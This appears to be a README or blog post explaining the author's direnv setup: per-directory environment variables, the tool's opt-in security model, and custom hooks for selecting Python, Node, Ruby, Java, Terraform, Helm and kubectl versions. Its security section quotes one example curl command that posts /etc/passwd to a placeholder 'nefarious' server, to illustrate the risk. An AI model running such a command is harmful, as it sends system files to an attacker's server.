# Direnv

[Direnv][direnv] has become more a part of my regular workflow as time goes on. It controls environment variables and can act as a set of project-specific hooks based on the current working directory, all with a system that requires explicit opt-in for security.

I use it here for sandboxing project settings in a way that doesn't affect my entire operating system.

Direnv primarily handles environment variables, which cover a lot more use cases than you would imagine. `PATH` is an environment variable that lets your shell know where to search for a given command. `LD_LIBRARY_PATH` tells a compiler (and there may be one built into something like `gem install` or `pip install` without you realizing) where to look for libraries and `.so` files. A majority of the functionality from Python's `virtualenv` feature is given by manipulating environment variables.

## Why Direnv?

### Directory-specific contexts

When working on a project, there are 3 things I typically do:

1. I change directory to the root of the project
2. I initialize a git repository
3. I start a tmux session within that directory, naming it accordingly

When I'm in that project directory, I'm thinking about the project itself. When I switch away to another directory, I'm also switching contexts to that other project. It stands to reason that the directory switch should also merit a context switch with my settings. This is where direnv comes in.

Direnv allows setting environment variables on entering a directory (or one of its subdirectories), and unsetting them on leaving the directory. This fits exactly with my use-case for context switching.

### Security controls included

By default, in case I'm storing project specific credentials as environment variables, I have `.envrc` globally ignored by git. That doesn't mean someone else hasn't included their own `.envrc` file into their repositories. With other tools like `dotenv`, their respective `.env` configurations would automatically read them and, in some cases, blindly `eval` their contents into the current shell session. This is a rather large security risk since it can possibly `curl -H 'Content-Type: text/plain' -X POST -d $(cat /etc/passwd) https://my-nefarious-server.example.com/secret-stealer`, thereby uploading your local machine's password hashes to some nefarious server they control.

Direnv doesn't allow that. If there is a new `.envrc` file, it requires manual confirmation that it is safe before it would try to evaluate it. Once it gets the go-ahead, it doesn't ask again unless that file changes. This forces the person cloning a repository to look at the `.envrc`, see the nefarious code, and re-evaluate if there might be other landmines in that code which makes it less desireable to use.

### Extensive standard library

While you _can_ put just environment variables in your `.envrc`, there's a whole world of customization available too. Calling `direnv stdlib` (or [`man direnv-stdlib`][direnv-stdlib]) will give you a peek into what is offered as far as syntax is concerned as far as the execution environment where `.envrc` is evaluated.

This means I can call `layout python /usr/local/bin/python3.8` and it will setup a python virtualenv for me using that specific python binary. I can do similar things with NodeJS, RVM, Rbenv, Anaconda, and others. On a more personal note, I've seen patterns for how this is implemented and extended it to integrate the tools I use first and foremost.

With my `direnvrc` (located at `~/.config/direnv/direnvrc`), I implement the back-end such that `use python 3.8` will find the latest installed Python version matching the 3.8.x specifier, as installed by Pyenv, setup my python virtualenv with that python binary, and activate that virtualenv purely on entering the directory. Similar can be said about NodeJS with node binaries provided by Nodeenv, ruby binaries provided by chruby/ruby-install, and so on.

I've even followed the same approach for having multiple `kubectl`, `terraform`, and `helm` binaries available and linked depending on the project specifics.

### Minimalism

Have an `.envrc` file that sets up the defaults for projects company-wide? You can inherit what's in that file and still add project specific settings by creating an `.envrc` in your project directory and calling `source_up` to read the `.envrc` in the parent/ancestor's directory.

Additional, direnv doesn't try to be something it's not. Shell functions are not exported, it only sets and manages environment variables. That's all that's translated through to your shell. This means you don't need to write your `.envrc` in `fish` syntax if you use the `fish` shell, or zsh if you use that shell.

## What's in it?

My [direnv][direnv] configuration has the following customizations from default:

- Use `nodenv`-supplied installations of NodeJS when calling `use node <version-specifier>`
- Use `ruby-install`-supplied installations of Ruby when calling `use ruby <version-specifier>`
- Use `pyenv`-supplied installations of Python when calling `use python <version-specifier>`
- Use `jabba`-supplied installations of Java when calling `use java <version-specifier>`
- Allow setting `chef shell-init` (ChefDK) only in projects where you work on Chef software, using `use chef`
- Control which version of Terraform to use with `use terraform 12`
- Control which version of Helm to use with `use helm 3.0.0-beta.3`
- Control which version of kubectl to use with `use kubectl 1.17.3`
- Control the current kubeconfig context with `use kubectx company-stage`
- Read project-specific NeoVim configurations with `use customized_vim` and a `.vimrc` file next to `.envrc`

[direnv]: https://direnv.net
[direnv-stdlib]: https://direnv.net/#man/direnv-stdlib.1
